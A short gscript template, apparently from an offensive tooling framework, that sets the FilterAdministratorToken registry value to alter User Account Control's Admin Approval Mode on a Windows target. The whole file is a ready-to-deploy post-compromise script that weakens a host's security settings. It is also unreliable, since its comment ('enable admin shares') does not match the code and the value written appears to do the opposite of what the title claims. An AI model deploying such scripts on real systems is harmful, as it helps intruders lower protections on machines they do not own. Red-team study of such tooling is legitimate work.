// Example gscript template
// Title: Disable Admin Approval Mode
// Author: ahhh
// Purpose: This will disable the admin approval mode
// Gscript version: 1.0.0
// ATT&CK: 

//priority:100
//timeout:150

//go_import:github.com/gen0cide/gscript/x/windows as windows

function Deploy() {
    console.log("Starting Disable Admin Approval Mode");

    var value = 1
    // enable admin shares
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "FilterAdministratorToken", value);

    console.log("Done Disable Admin Approval Mode");
    return true;
  }
  